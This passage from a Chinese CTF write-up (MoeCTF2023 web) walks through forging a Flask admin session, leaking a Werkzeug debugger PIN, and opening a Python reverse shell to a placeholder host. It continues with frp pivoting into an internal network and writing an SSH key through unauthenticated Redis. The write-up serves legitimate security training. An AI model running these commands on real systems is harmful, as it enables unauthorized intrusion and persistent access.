            linux <span class="token operator">+=</span> f<span class="token punctuation">.</span>readline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>rpartition<span class="token punctuation">(</span><span class="token string">b"/"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span>
    <span class="token keyword">except</span> OSError<span class="token punctuation">:</span>
        <span class="token keyword">pass</span>
    linux <span class="token operator">=</span> linux<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>
    private_bits <span class="token operator">=</span> <span class="token punctuation">[</span>
        uuid1<span class="token punctuation">,</span>
        linux<span class="token punctuation">,</span>
    <span class="token punctuation">]</span>
    h <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>sha1<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">for</span> bit <span class="token keyword">in</span> chain<span class="token punctuation">(</span>probably_public_bits<span class="token punctuation">,</span> private_bits<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> <span class="token keyword">not</span> bit<span class="token punctuation">:</span>
                <span class="token keyword">continue</span>
        <span class="token keyword">if</span> <span class="token builtin">isinstance</span><span class="token punctuation">(</span>bit<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            bit <span class="token operator">=</span> bit<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span>
        h<span class="token punctuation">.</span>update<span class="token punctuation">(</span>bit<span class="token punctuation">)</span>
    h<span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token string">b"cookiesalt"</span><span class="token punctuation">)</span>

    cookie_name <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"__wzd</span><span class="token interpolation"><span class="token punctuation">&#123;</span>h<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token format-spec">20]</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span>

    num <span class="token operator">=</span> <span class="token boolean">None</span>
    <span class="token keyword">if</span> num <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
        h<span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token string">b"pinsalt"</span><span class="token punctuation">)</span>
        num <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">int</span><span class="token punctuation">(</span>h<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token format-spec">09d</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">9</span><span class="token punctuation">]</span>

    rv<span class="token operator">=</span><span class="token boolean">None</span>
    <span class="token keyword">if</span> rv <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
        <span class="token keyword">for</span> group_size <span class="token keyword">in</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">:</span>
            <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span> <span class="token operator">%</span> group_size <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>
                rv <span class="token operator">=</span> <span class="token string">"-"</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>
                    num<span class="token punctuation">[</span>x <span class="token punctuation">:</span> x <span class="token operator">+</span> group_size<span class="token punctuation">]</span><span class="token punctuation">.</span>rjust<span class="token punctuation">(</span>group_size<span class="token punctuation">,</span> <span class="token string">"0"</span><span class="token punctuation">)</span>
                    <span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">,</span> group_size<span class="token punctuation">)</span>
                <span class="token punctuation">)</span>
                <span class="token keyword">break</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            rv <span class="token operator">=</span> num

    <span class="token keyword">return</span> rv</code></pre>

<p>初步分析代码来看需要伪造session会话然后登录管理员账号</p>
<pre class="language-python" data-language="python"><code class="language-python">app<span class="token punctuation">.</span>secret_key <span class="token operator">=</span> <span class="token string">"This-random-secretKey-you-can't-get"</span> <span class="token operator">+</span> os<span class="token punctuation">.</span>urandom<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token comment">#关键代码为这一行前面值固定后面不唯一系统随机生成使用python脚本进行暴力枚举</span>
</code></pre>

<p>这个题目和某一个题目非常的相似</p>
<p>[<a target="_blank" rel="noopener" href="https://blog.csdn.net/Sapphire037/article/details/126919498">CTF]2022美团CTF WEB WP_os.urandom(2).hex()_Sapphire037的博客-CSDN博客</a></p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> os
<span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'dict.txt'</span><span class="token punctuation">,</span><span class="token string">'w'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
	<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">50000</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
		a<span class="token operator">=</span><span class="token string">"This-random-secretKey-you-can't-get"</span><span class="token operator">+</span>os<span class="token punctuation">.</span>urandom<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
		f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>a<span class="token punctuation">)</span>
		f<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span>
</code></pre>

<p><a target="_blank" rel="noopener" href="https://github.com/Paradoxis/Flask-Unsign">Paradoxis&#x2F;Flask-Unsign: Command line tool to fetch, decode, brute-force and craft session cookies of a Flask application by guessing secret keys. (github.com)</a></p>
<p><a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=flask&spm=1001.2101.3001.7020">flask</a>-unsign工具可以通过字典爆破key</p>
<p>先注册一个用户来获取当前的session</p>
<pre class="language-none"><code class="language-none">flask-unsign.exe --unsign --cookie &quot;eyJwb3dlciI6Imd1ZXN0IiwidXNlciI6ImFiY2QifQ.ZQ6D4A.1l_objuFHXoApsS1mvzzMsl9k2w&quot; --wordlist .\dict.txt</code></pre>

<p><img src="https://gitee.com/wodi98k/cnblogsimages/raw/master/img/image-20230923142853852.png" alt="image-20230923142853852" loading="lazy"></p>
<p>使用flask-session-cookie-manager 工具对获取的key进行加密管理员session</p>
<p><img src="https://gitee.com/wodi98k/cnblogsimages/raw/master/img/image-20230923143402274.png" alt="image-20230923143402274" loading="lazy"></p>
<p>替换原本session进行登录可见pin泄露</p>
<p><img src="https://gitee.com/wodi98k/cnblogsimages/raw/master/img/image-20230923143843592.png" alt="image-20230923143843592" loading="lazy"></p>
<p>有了该pin码可访问给出的console接口从而执行任意命令</p>
<p><a target="_blank" rel="noopener" href="http://47.115.201.35:8000/console">http://47.115.201.35:8000/console</a></p>
<p><img src="https://gitee.com/wodi98k/cnblogsimages/raw/master/img/image-20230923144108060.png" alt="image-20230923144108060" loading="lazy"></p>
<p>到现在外网基本拿下了接下来需要内网渗透根据题目提示需要读取根目录的提示文件</p>
<p><img src="https://gitee.com/wodi98k/cnblogsimages/raw/master/img/image-20230923144614869.png" alt="image-20230923144614869" loading="lazy"></p>
<p>由于该页面操作不是特别友好反弹一个shell在vps上以便后续操作</p>
<p>反弹shell生成网站：<a target="_blank" rel="noopener" href="https://www.ddosi.org/shell/">反弹shell命令在线生成器|🔰雨苁🔰 (ddosi.org)</a></p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">import</span> socket,subprocess,os<span class="token punctuation">;</span><span class="token assign-left variable">s</span><span class="token operator">=</span>socket.socket<span class="token punctuation">(</span>socket.AF_INET,socket.SOCK_STREAM<span class="token punctuation">)</span><span class="token punctuation">;</span>s.connect<span class="token variable"><span class="token punctuation">((</span>"your<span class="token operator">-</span>ip"<span class="token punctuation">,</span><span class="token number">7777</span><span class="token punctuation">))</span></span><span class="token punctuation">;</span>os.dup2<span class="token punctuation">(</span>s.fileno<span class="token punctuation">(</span><span class="token punctuation">)</span>,0<span class="token punctuation">)</span><span class="token punctuation">;</span> os.dup2<span class="token punctuation">(</span>s.fileno<span class="token punctuation">(</span><span class="token punctuation">)</span>,1<span class="token punctuation">)</span><span class="token punctuation">;</span>os.dup2<span class="token punctuation">(</span>s.fileno<span class="token punctuation">(</span><span class="token punctuation">)</span>,2<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">import</span> pty<span class="token punctuation">;</span> pty.spawn<span class="token punctuation">(</span><span class="token string">"sh"</span><span class="token punctuation">)</span></code></pre>

<p><img src="https://gitee.com/wodi98k/cnblogsimages/raw/master/img/image-20230923145032369.png" alt="image-20230923145032369" loading="lazy"></p>
<p>根据前面的提示需要对内网进行扫描，使用fscan工具对其它主机进行一个初步的判断</p>
<p><img src="https://gitee.com/wodi98k/cnblogsimages/raw/master/img/image-20230923145238948.png" alt="image-20230923145238948" loading="lazy"></p>
<p><img src="https://gitee.com/wodi98k/cnblogsimages/raw/master/img/image-20230923145730806.png" alt="image-20230923145730806" loading="lazy"></p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token number">172.20</span>.0.1:888 <span class="token function">open</span>
<span class="token number">172.20</span>.0.2:22 <span class="token function">open</span>
<span class="token number">172.20</span>.0.1:22 <span class="token function">open</span>
<span class="token number">172.20</span>.0.1:21 <span class="token function">open</span>
<span class="token number">172.20</span>.0.2:6379 <span class="token function">open</span>
<span class="token number">172.20</span>.0.4:8080 <span class="token function">open</span>
<span class="token number">172.20</span>.0.1:80 <span class="token function">open</span>
<span class="token number">172.20</span>.0.3:3306 <span class="token function">open</span>
<span class="token number">172.20</span>.0.1:3306 <span class="token function">open</span>
<span class="token number">172.20</span>.0.1:7777 <span class="token function">open</span></code></pre>

<p>排除网关地址存在mysql和redis根据题目要求可解出第二个压缩包密码</p>
<p><strong>22-3306-6379-8080</strong></p>
<pre class="language-none"><code class="language-none">当你看到此部分，证明你正确的进行了fscan的操作得到了正确的结果
可以看到，在本内网下还有另外两台服务器
其中一台开启了22(ssh)和6379(redis)端口
另一台开启了3306(mysql)端口
还有一台正是你访问到的留言板服务
接下来，你可能需要搭建代理，从而使你的本机能直接访问到内网的服务器
此处可了解&#96;nps&#96;和&#96;frp&#96;，同样在&#x2F;app&#x2F;tools已内置了相应文件
连接代理，推荐&#96;proxychains&#96;
对于mysql服务器，你需要找到其账号密码并成功连接，在数据库中找到flag2
对于redis服务器，你可以学习其相关的渗透技巧，从而获取到redis的权限，并进一步寻找其getshell的方式，最终得到flag3
</code></pre>

<p>到这里就需要搭建代理进行内网渗透了推荐使用frp进行内网穿透VPS搭建好服务端</p>
<p>基本配置如下</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span>common<span class="token punctuation">]</span>
bind_port <span class="token operator">=</span> <span class="token number">7000</span></code></pre>

<p>接下来是客户端配置</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span>common<span class="token punctuation">]</span>
<span class="token assign-left variable">server_addr</span><span class="token operator">=</span>vps-addr
<span class="token assign-left variable">server_port</span><span class="token operator">=</span><span class="token number">7000</span>
<span class="token punctuation">[</span>socks5_proxy<span class="token punctuation">]</span>
remote_port <span class="token operator">=</span> <span class="token number">6005</span>
plugin <span class="token operator">=</span> socks5
<span class="token punctuation">[</span>mysql<span class="token punctuation">]</span>
<span class="token builtin class-name">type</span> <span class="token operator">=</span> tcp
local_ip <span class="token operator">=</span> <span class="token number">172.20</span>.0.3
local_port <span class="token operator">=</span> <span class="token number">3306</span>
remote_port <span class="token operator">=</span> <span class="token number">6001</span></code></pre>

<p>由于反弹shell不太好写入只能一行一行的进行写入</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/frdevolcqzyxynjds/article/details/106785218">linux之echo写入单行文件，cat写入多行文件_echo写入多行_闭关苦炼内功的博客-CSDN博客</a></p>
<p>链接VPS IP即可密码在网站根目录有给出</p>
<pre class="language-none"><code class="language-none">passwd&#x3D;&quot;The_P0sswOrD_Y0u_Nev3r_Kn0w&quot;</code></pre>

<p><img src="https://gitee.com/wodi98k/cnblogsimages/raw/master/img/image-20230923160506306.png" alt="image-20230923160506306" loading="lazy"></p>
<p><img src="https://gitee.com/wodi98k/cnblogsimages/raw/master/img/image-20230923160820637.png" alt="image-20230923160820637" loading="lazy"></p>
<p>接下来需要利用内网的redis进行下一步操作修改frp配置文件连接redis</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/FryhRx/article/details/124087653">redis未授权访问漏洞三种提权方式_redis提权_遇事不决，可问春风、的博客-CSDN博客</a></p>
<pre class="language-none"><code class="language-none">[redis]
type &#x3D; tcp
local_ip &#x3D; 172.20.0.2
local_port &#x3D; 6379
remote_port &#x3D; 6002
[ssh]
type &#x3D; tcp
local_ip &#x3D; 172.20.0.2
local_port &#x3D; 22
remote_port &#x3D; 6003</code></pre>

<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">(</span>echo <span class="token parameter variable">-e</span> <span class="token string">"<span class="token entity" title="\n">\n</span><span class="token entity" title="\n">\n</span>"</span><span class="token punctuation">;</span> <span class="token function">cat</span> id_rsa.pub<span class="token punctuation">;</span> <span class="token builtin class-name">echo</span> <span class="token parameter variable">-e</span> <span class="token string">"<span class="token entity" title="\n">\n</span><span class="token entity" title="\n">\n</span>"</span><span class="token punctuation">)</span> <span class="token operator">></span> key.txt
<span class="token function">cat</span> /root/.ssh/key.txt <span class="token operator">|</span> redis-cli <span class="token parameter variable">-h</span> vps-ip <span class="token parameter variable">-p</span> <span class="token number">6002</span> <span class="token parameter variable">-x</span> <span class="token builtin class-name">set</span> xxx</code></pre>

<p><img src="https://gitee.com/wodi98k/cnblogsimages/raw/master/img/image-20230923162650038.png" alt="image-20230923162650038" loading="lazy"></p>
<p>写入ssh公钥使用vps私钥连接即可同时也需要挂上代理</p>
<p><strong>ssh -i id_rsa  root@vps-ip  -p 6003</strong></p>
<p><img src="https://gitee.com/wodi98k/cnblogsimages/raw/master/img/image-20230923163217649.png" alt="image-20230923163217649" loading="lazy"></p>
</div></section><div id="reward-container"><span class="hty-icon-button button-glow" id="reward-button" title="打赏" onclick="var qr = document.getElementById(&quot;qr&quot;); qr.style.display = (qr.style.display === &quot;none&quot;) ? &quot;block&quot; : &quot;none&quot;;"><span class="icon iconify" data-icon="ri:hand-coin-line"></span></span><div id="reward-comment">I'm so cute. Please give me money.</div></div><ul class="post-copyright"><li class="post-copyright-author"><strong>本文作者：</strong>Hsad</li><li class="post-copyright-link"><strong>本文链接：</strong><a href="https://hsad.xyz/2024/07/16/MoeCTF2023-web/MoeCTF2023-web-TT/" title="">https://hsad.xyz/2024/07/16/MoeCTF2023-web/MoeCTF2023-web-TT/</a></li><li class="post-copyright-license"><strong>版权声明：</strong>本博客所有文章除特别声明外，均默认采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="noopener" title="CC BY-NC-SA 4.0 "><span class="icon iconify" data-icon="ri:creative-commons-line"></span><span class="icon iconify" data-icon="ri:creative-commons-by-line"></span><span class="icon iconify" data-icon="ri:creative-commons-nc-line"></span><span class="icon iconify" data-icon="ri:creative-commons-sa-line"></span></a> 许可协议。</li></ul></article><div class="post-nav"><div class="post-nav-item"></div><div class="post-nav-item"><a class="post-nav-next" href="/2024/07/16/MoeCTF2023-web/moeworld/" rel="next" title=""><span class="post-nav-text"></span><span class="icon iconify" data-icon="ri:arrow-right-s-line"></span></a></div></div></div><div class="hty-card" id="comment"></div></main><footer class="sidebar-translate" id="footer"><div class="copyright"><span>&copy; 2019 – 2024 </span><span class="with-love" id="animate"><span class="icon iconify" data-icon="ri:cloud-line"></span></span><span class="author"> Hsad</span></div><div class="powered"><span>由 <a href="https://hexo.io" target="_blank" rel="noopener">Hexo</a> 驱动 v7.2.0</span><span class="footer-separator">|</span><span>主题 - <a rel="noopener" href="https://github.com/YunYouJun/hexo-theme-yun" target="_blank"><span>Yun</span></a> v1.10.11</span></div></footer></div><a class="hty-icon-button" id="back-to-top" aria-label="back-to-top" href="#"><span class="icon iconify" data-icon="ri:arrow-up-s-line"></span><svg class="progress-circle-container" viewBox="0 0 100 100"><circle class="progress-circle" id="progressCircle" cx="50" cy="50" r="48" fill="none" stroke="#0078E7" stroke-width="2" stroke-linecap="round"></circle></svg></a><script src="https://fastly.jsdelivr.net/npm/medium-zoom@1.0.6/dist/medium-zoom.min.js"></script><script>const images = [...document.querySelectorAll('.markdown-body img')]
mediumZoom(images)</script><style>.medium-zoom-image {
  z-index: 99;
}</style></body></html>